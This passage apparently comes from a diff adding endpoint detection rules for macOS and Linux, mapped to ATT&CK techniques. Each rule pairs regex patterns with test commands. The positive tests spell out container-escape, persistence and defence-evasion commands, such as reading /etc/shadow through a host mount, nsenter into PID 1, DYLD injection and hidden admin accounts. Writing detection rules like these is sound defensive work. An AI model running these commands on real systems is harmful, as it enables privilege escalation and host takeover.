+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/libexec/ApplicationFirewall/socketfilterfw",
+      "command": "socketfilterfw --setglobalstate off"
+     },
+     {
+      "executable": "/sbin/pfctl",
+      "command": "pfctl -d"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/libexec/ApplicationFirewall/socketfilterfw",
+      "command": "socketfilterfw --getglobalstate"
+     },
+     {
+      "executable": "/sbin/pfctl",
+      "command": "pfctl -sr"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-codesign-adhoc-staged",
+   "name": "Ad hoc re-signing of a downloaded or staged app",
+   "description": "codesign --force -s - on an app or binary in /tmp, Downloads or /Users/Shared, used after patching to satisfy the loader.",
+   "tactic": "Defense Evasion",
+   "technique": "T1553.002",
+   "technique_name": "Subvert Trust Controls: Code Signing",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/codesign"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--force|\\s-f\\s"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-s\\s+-(\\s|$)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/tmp/|/Downloads/|/Users/Shared/)"
+     }
+    ]
+   },
+   "tags": [
+    "codesign",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/codesign",
+      "command": "codesign --force --deep -s - /Users/ann/Downloads/Patched.app"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/codesign",
+      "command": "codesign --force --deep -s - /Users/ann/dev/build/MyApp.app"
+     },
+     {
+      "executable": "/usr/bin/codesign",
+      "command": "codesign -dv /Applications/Safari.app"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-av-discovery-ps",
+   "name": "Security tool discovery through process list",
+   "description": "ps/launchctl piped to grep for security products on macOS.",
+   "tactic": "Discovery",
+   "technique": "T1518.001",
+   "technique_name": "Software Discovery: Security Software Discovery",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "any": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(ps\\s+(aux|-ef|ax)|launchctl\\s+list)\\b.*\\|\\s*grep\\s+(-\\w+\\s+)*['\\\"]?(lulu|little ?snitch|blockblock|crowdstrike|falcon|jamf|sentinel|carbonblack|knockknock)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\bls\\s+(-\\w+\\s+)*/(Library|Applications)/(Application Support/)?(Objective-See|Little Snitch|LuLu|BlockBlock|CrowdStrike|Falcon|Jamf)"
+     }
+    ]
+   },
+   "tags": [
+    "discovery",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c ps aux | grep -i -E crowdstrike|jamf"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c launchctl list | grep -i falcon"
+     },
+     {
+      "executable": "/bin/ls",
+      "command": "ls /Library/Little Snitch"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c ps aux | grep node"
+     },
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl list"
+     },
+     {
+      "executable": "/bin/ls",
+      "command": "ls /Library/Fonts"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-vm-sandbox-check",
+   "name": "Virtualization or sandbox detection via sysctl or ioreg",
+   "description": "sysctl for VMM/hypervisor flags or ioreg grepping for VM vendor strings.",
+   "tactic": "Defense Evasion",
+   "technique": "T1497.001",
+   "technique_name": "Virtualization/Sandbox Evasion: System Checks",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "sysctl\\s+(-n\\s+)?(machdep\\.cpu\\.features|kern\\.hv_vmm_present|hw\\.model)\\b.*(VMM|vmm)|ioreg\\b.*\\|\\s*grep\\s+(-\\w+\\s+)*['\\\"]?(virtualbox|vmware|parallels|qemu)|ioreg\\b.*\\|\\s*grep\\s+.*-e\\s+['\\\"]?(vmware|virtualbox)"
+   },
+   "tags": [
+    "evasion",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c sysctl -n machdep.cpu.features | grep VMM"
+     },
+     {
+      "executable": "/bin/bash",
+      "command": "bash -c ioreg -l | grep -i -e vmware -e virtualbox"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/sysctl",
+      "command": "sysctl -n machdep.cpu.brand_string"
+     },
+     {
+      "executable": "/usr/sbin/sysctl",
+      "command": "sysctl hw.ncpu"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-launchd-plist-staging",
+   "name": "launchd job loaded from an unusual directory",
+   "description": "launchctl load/bootstrap pointing at a plist in /tmp, /Users/Shared or a hidden path.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/launchctl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\b(load|bootstrap|submit|enable)\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(/private/tmp/|\\s/tmp/|/Users/Shared/|/var/tmp/|/\\.[^/\\s]+/[^\\s]*\\.plist)"
+     }
+    ]
+   },
+   "tags": [
+    "launchd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl load -w /Users/Shared/com.apple.sync.plist"
+     },
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl bootstrap gui/501 /private/tmp/agent.plist"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl bootstrap gui/501 /Users/ann/Library/LaunchAgents/com.example.sync.plist"
+     },
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl list"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-launchctl-submit",
+   "name": "launchctl submit starting an ad hoc job",
+   "description": "launchctl submit -l label -- program, an unusual way to start a persistent job.",
+   "tactic": "Persistence",
+   "technique": "T1569.001",
+   "technique_name": "System Services: Launchctl",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "launchctl\\s+submit\\s+-l\\s+\\S+\\s+--"
+   },
+   "tags": [
+    "launchd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl submit -l com.apple.helper -- /tmp/.agent"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl list com.apple.helper"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-launchctl-setenv-dyld",
+   "name": "launchctl setenv with a dyld injection variable",
+   "description": "launchctl setenv DYLD_INSERT_LIBRARIES sets it for subsequent launches.",
+   "tactic": "Persistence",
+   "technique": "T1574.006",
+   "technique_name": "Hijack Execution Flow: Dynamic Linker Hijacking",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "launchctl\\s+setenv\\s+(DYLD_\\w+|LD_PRELOAD)"
+   },
+   "tags": [
+    "dyld",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl setenv DYLD_INSERT_LIBRARIES /tmp/hook.dylib"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/bin/launchctl",
+      "command": "launchctl setenv JAVA_HOME /Library/Java/Home"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-plistbuddy-launchagent",
+   "name": "LaunchAgent plist built with PlistBuddy or defaults write",
+   "description": "PlistBuddy/defaults/plutil creating RunAtLoad and ProgramArguments in a LaunchAgents or LaunchDaemons file.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(PlistBuddy|defaults write|plutil -insert)"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "Launch(Agents|Daemons)/"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(RunAtLoad|ProgramArguments|KeepAlive)"
+     }
+    ]
+   },
+   "tags": [
+    "launchd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/libexec/PlistBuddy",
+      "command": "PlistBuddy -c Add :RunAtLoad bool true /Users/ann/Library/LaunchAgents/com.x.plist"
+     },
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write /Library/LaunchDaemons/com.y.plist ProgramArguments -array /tmp/y"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/libexec/PlistBuddy",
+      "command": "PlistBuddy -c Print :Label /Library/LaunchDaemons/com.docker.vmnetd.plist"
+     },
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults read /Library/LaunchDaemons/com.x.plist"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-launch-plist-file",
+   "name": "LaunchAgent or LaunchDaemon plist written",
+   "description": "File event for a plist in LaunchAgents or LaunchDaemons.",
+   "tactic": "Persistence",
+   "technique": "T1543.001",
+   "technique_name": "Create or Modify System Process: Launch Agent",
+   "severity": "low",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "/Library/Launch(Agents|Daemons)/[^/]+\\.plist$"
+   },
+   "tags": [
+    "launchd",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Users/ann/Library/LaunchAgents/com.apple.updater.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/Users/ann/Library/LaunchAgents/notes.txt",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-loginhook",
+   "name": "Login or logout hook configured",
+   "description": "defaults write com.apple.loginwindow LoginHook/LogoutHook.",
+   "tactic": "Persistence",
+   "technique": "T1037.002",
+   "technique_name": "Boot or Logon Initialization Scripts: Login Hook",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "com\\.apple\\.loginwindow\\s+(LoginHook|LogoutHook)\\s"
+   },
+   "tags": [
+    "login-hook",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write com.apple.loginwindow LoginHook /Users/Shared/h.sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults read com.apple.loginwindow LoginwindowText"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-emond-rule",
+   "name": "emond rule file created",
+   "description": "A plist in /etc/emond.d/rules runs commands on system events.",
+   "tactic": "Persistence",
+   "technique": "T1546.014",
+   "technique_name": "Event Triggered Execution: Emond",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "^(/private)?/etc/emond\\.d/rules/[^/]+\\.plist$"
+   },
+   "tags": [
+    "emond",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/etc/emond.d/rules/sample.plist",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/emond.d/rules/README.md",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-startupitems-periodic",
+   "name": "StartupItems or periodic script dropped",
+   "description": "A file in /Library/StartupItems or /etc/periodic.",
+   "tactic": "Persistence",
+   "technique": "T1037.005",
+   "technique_name": "Boot or Logon Initialization Scripts: Startup Items",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "file",
+   "match": {
+    "field": "path",
+    "op": "regex",
+    "pattern": "^(/private)?/(Library/StartupItems/[^/]+/[^/]+|etc/periodic/(daily|weekly|monthly)/[^/]+)$"
+   },
+   "tags": [
+    "startup",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "path": "/Library/StartupItems/Upd/Upd",
+      "operation": "create"
+     },
+     {
+      "path": "/etc/periodic/daily/999.local",
+      "operation": "create"
+     }
+    ],
+    "negative": [
+     {
+      "path": "/etc/periodic/README",
+      "operation": "create"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-hidden-user-dscl",
+   "name": "Hidden local account created with dscl",
+   "description": "dscl create IsHidden 1, or defaults Hide500Users, concealing an account from the login window.",
+   "tactic": "Defense Evasion",
+   "technique": "T1564.002",
+   "technique_name": "Hide Artifacts: Hidden Users",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "dscl\\b.*-create\\s+/Users/\\S+\\s+IsHidden\\s+1|com\\.apple\\.loginwindow\\s+Hide500Users\\s+-bool\\s+(true|yes)"
+   },
+   "tags": [
+    "account",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -create /Users/_sync IsHidden 1"
+     },
+     {
+      "executable": "/usr/bin/defaults",
+      "command": "defaults write /Library/Preferences/com.apple.loginwindow Hide500Users -bool YES"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -create /Users/ci UserShell /bin/zsh"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-admin-group-add",
+   "name": "User added to admin group through dscl or sysadminctl",
+   "description": "dscl -append /Groups/admin GroupMembership, or sysadminctl -addUser with -admin.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1098",
+   "technique_name": "Account Manipulation",
+   "severity": "high",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "dscl\\b.*-append\\s+/Groups/(admin|wheel)\\s+GroupMembership|sysadminctl\\b.*-addUser\\b.*-admin\\b"
+   },
+   "tags": [
+    "account",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -append /Groups/admin GroupMembership _sync"
+     },
+     {
+      "executable": "/usr/sbin/sysadminctl",
+      "command": "sysadminctl -addUser tmp -password x -admin"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/dscl",
+      "command": "dscl . -read /Groups/admin GroupMembership"
+     },
+     {
+      "executable": "/usr/sbin/sysadminctl",
+      "command": "sysadminctl -addUser student -password x"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-mac-network-proxy-set",
+   "name": "System proxy configured from the command line",
+   "description": "networksetup -setwebproxy/-setsocksfirewallproxy/-setsecurewebproxy pointing at a non-local address.",
+   "tactic": "Command and Control",
+   "technique": "T1090",
+   "technique_name": "Proxy",
+   "severity": "medium",
+   "os": "macos",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "networksetup\\s+-set(web|secureweb|socksfirewall|autoproxy|ftp)proxy\\s+\\S+\\s+\\S+"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "\\s(127\\.0\\.0\\.1|localhost)(\\s|$)"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "proxy",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/networksetup",
+      "command": "networksetup -setsocksfirewallproxy Wi-Fi 203.0.113.9 1080"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/networksetup",
+      "command": "networksetup -setwebproxystate Wi-Fi off"
+     },
+     {
+      "executable": "/usr/sbin/networksetup",
+      "command": "networksetup -setwebproxy Wi-Fi 127.0.0.1 8080"
+     },
+     {
+      "executable": "/usr/sbin/networksetup",
+      "command": "networksetup -listallnetworkservices"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-sock-api-curl",
+   "name": "Docker Engine API called over the unix socket with curl",
+   "description": "curl --unix-socket /var/run/docker.sock creating or starting containers, usable from inside a container that has the socket mounted.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/curl"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--unix-socket\\s+\\S*docker\\.sock"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "/(containers/(create|\\S+/(start|exec))|images/create|exec/\\S+/start)"
+     }
+    ]
+   },
+   "tags": [
+    "docker",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s --unix-socket /var/run/docker.sock -X POST -H Content-Type:application/json http://localhost/containers/create?name=x -d {\"Image\":\"alpine\"}"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl --unix-socket /var/run/docker.sock http://localhost/version"
+     },
+     {
+      "executable": "/usr/bin/curl",
+      "command": "curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-run-host-root-mount",
+   "name": "Container started with the host root filesystem mounted",
+   "description": "docker/podman/nerdctl run -v /:/something (or /:/host), giving the container full host file access.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/docker",
+       "/podman",
+       "/nerdctl"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\brun\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-v|--volume|--mount\\s+type=bind,source=)\\s*/(:|,)"
+     }
+    ]
+   },
+   "tags": [
+    "docker",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -it --rm -v /:/host alpine chroot /host sh"
+     },
+     {
+      "executable": "/usr/bin/podman",
+      "command": "podman run -v /:/mnt:rw ubuntu bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --rm -v /var/lib/app:/data alpine ls /data"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --rm -v $(pwd):/src golang:1.22 go build ./..."
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-run-sensitive-host-mount",
+   "name": "Container started with a sensitive host directory mounted",
+   "description": "A bind mount of /etc, /root, /var/lib/kubelet or /proc into a new container.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/docker",
+       "/podman",
+       "/nerdctl"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\brun\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-v|--volume)\\s*/(etc|root|var/lib/kubelet|proc|sys|boot|home/[^/:]+/\\.(ssh|aws|kube|gnupg))(:|/\\S*:)"
+     },
+     {
+      "not": {
+       "field": "command",
+       "op": "regex",
+       "pattern": "-v\\s*/etc/(localtime|timezone|resolv\\.conf|hosts|ssl/certs|ca-certificates)\\S*:"
+      }
+     }
+    ]
+   },
+   "tags": [
+    "docker",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -v /etc:/host_etc alpine cat /host_etc/shadow"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -v /root/.ssh:/k busybox ls /k"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -v /etc/localtime:/etc/localtime:ro nginx"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -v $(pwd)/etc:/etc/app myimg"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-run-priv-host-ns",
+   "name": "Privileged container sharing host namespaces",
+   "description": "docker run --privileged combined with --pid=host, --net=host, --ipc=host, or a host mount, the textbook escape setup.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/docker",
+       "/podman",
+       "/nerdctl"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\brun\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--privileged"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--pid[= ]host|--ipc[= ]host|--uts[= ]host|-v\\s*/:|--device[= ]/dev/(sd|vd|nvme|xvd)"
+     }
+    ]
+   },
+   "tags": [
+    "docker",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --rm -it --privileged --pid=host alpine nsenter -t 1 -m -u -n -i sh"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --privileged --device /dev/sda1 ubuntu bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -d --privileged --name dind docker:dind"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --rm --pid=host alpine ps aux"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-run-privileged",
+   "name": "Container started with --privileged",
+   "description": "Any privileged container; frequently legitimate (Docker-in-Docker CI) so low severity.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "low",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/docker",
+       "/podman",
+       "/nerdctl",
+       "/ctr",
+       "/crictl"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\brun\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--privileged\\b"
+     }
+    ]
+   },
+   "tags": [
+    "docker",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -d --privileged --name dind docker:dind"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --rm hello-world"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-run-cap-or-unconfined",
+   "name": "Container started with SYS_ADMIN or disabled confinement",
+   "description": "--cap-add SYS_ADMIN/ALL/SYS_PTRACE/SYS_MODULE or --security-opt apparmor/seccomp=unconfined.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "medium",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/docker",
+       "/podman",
+       "/nerdctl"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\brun\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "--cap-add[= ](SYS_ADMIN|ALL|SYS_PTRACE|SYS_MODULE|DAC_READ_SEARCH)|--security-opt[= ](apparmor|seccomp)[=:]unconfined"
+     }
+    ]
+   },
+   "tags": [
+    "docker",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --security-opt seccomp=unconfined alpine sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --cap-add=NET_ADMIN alpine ip link"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run --cap-drop ALL alpine id"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-docker-sock-mount-shell",
+   "name": "Docker socket mounted into a shell container",
+   "description": "docker run with -v /var/run/docker.sock plus an interactive shell or the docker CLI, a one-step host takeover.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "any",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "patterns": [
+       "/docker",
+       "/podman",
+       "/nerdctl"
+      ]
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\brun\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "-v\\s*/var/run/docker\\.sock:"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "\\s(sh|bash|ash|/bin/sh)(\\s|$)|docker:cli|\\sdocker\\s"
+     }
+    ]
+   },
+   "tags": [
+    "docker",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -v /var/run/docker.sock:/var/run/docker.sock docker:cli docker run --privileged alpine"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -d -v /var/run/docker.sock:/var/run/docker.sock traefik:v3.0"
+     },
+     {
+      "executable": "/usr/bin/docker",
+      "command": "docker run -v $(pwd):/work alpine sh"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-nsenter-host-pid1",
+   "name": "nsenter into PID 1 namespaces",
+   "description": "nsenter --target 1 with mount/pid namespaces, entering the host from a privileged container.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "all": [
+     {
+      "field": "executable",
+      "op": "suffix",
+      "pattern": "/nsenter"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-t|--target)[= ]1\\b"
+     },
+     {
+      "field": "command",
+      "op": "regex",
+      "pattern": "(-m|-p|--mount|--pid|-a|--all)"
+     }
+    ]
+   },
+   "tags": [
+    "nsenter",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/bin/nsenter",
+      "command": "nsenter -t 1 -m -u -i -n -p sh"
+     },
+     {
+      "executable": "/usr/bin/nsenter",
+      "command": "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/bin/nsenter",
+      "command": "nsenter -t 4312 -n ip addr"
+     },
+     {
+      "executable": "/usr/bin/nsenter",
+      "command": "nsenter --target 8841 --net -- ss -tlnp"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-chroot-host-mount",
+   "name": "chroot into a mounted host root",
+   "description": "chroot /host or /mnt/host, the follow-up of a host filesystem mount in a container.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "\\bchroot\\s+(--userspec\\S+\\s+)?/(host|mnt/host|hostfs|rootfs|host-root)(\\s|$)"
+   },
+   "tags": [
+    "chroot",
+    "unix2"
+   ],
+   "batch": "unix2-v1",
+   "tests": {
+    "positive": [
+     {
+      "executable": "/usr/sbin/chroot",
+      "command": "chroot /host /bin/bash"
+     },
+     {
+      "executable": "/usr/sbin/chroot",
+      "command": "chroot /mnt/host sh"
+     }
+    ],
+    "negative": [
+     {
+      "executable": "/usr/sbin/chroot",
+      "command": "chroot /srv/jail /bin/sh"
+     },
+     {
+      "executable": "/usr/sbin/chroot",
+      "command": "chroot /mnt/gentoo /bin/bash"
+     }
+    ]
+   }
+  },
+  {
+   "id": "ux2-cgroup-release-agent",
+   "name": "cgroup release_agent abuse",
+   "description": "A command writes release_agent or notify_on_release under /sys/fs/cgroup, the cgroup v1 escape that runs a host command.",
+   "tactic": "Privilege Escalation",
+   "technique": "T1611",
+   "technique_name": "Escape to Host",
+   "severity": "high",
+   "os": "linux",
+   "event_type": "process",
+   "match": {
+    "field": "command",
+    "op": "regex",
+    "pattern": "(release_agent|notify_on_release)"
+   },
+   "tags": [
+    "cgroup",
